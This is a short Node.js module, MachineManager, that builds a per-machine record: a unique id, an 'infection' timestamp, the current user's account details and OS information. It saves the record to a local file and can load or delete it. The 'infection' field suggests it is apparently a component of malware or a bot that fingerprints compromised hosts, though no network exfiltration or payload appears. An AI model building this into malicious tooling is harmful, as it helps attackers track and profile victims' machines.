const os = require('os');
const fs = require('fs');
const uniqid = require('uniqid');

const { sysInfoPath } = require('../config');

class MachineManager {
  static generateId() {
    const systemInfo = {
      uuid: uniqid(),
      infection: Date.now(),
      user: os.userInfo(),
      os: {
        type: os.type(),
        platform: os.platform(),
        architeture: os.arch(),
        release: os.release(),
      }
    };

    fs.writeFileSync(sysInfoPath, JSON.stringify(systemInfo))

    return systemInfo;
  }

  static loadId() {
    if (!fs.existsSync(sysInfoPath)) {
      return null;
    }

    const systemInfo = JSON.parse(fs.readFileSync(sysInfoPath));

    if (typeof(systemInfo) != 'object') {
      return null;
    }

    return systemInfo;
  }

  static deleteId() {
    fs.unlinkSync(sysInfoPath);
  }
}

module.exports = MachineManager;
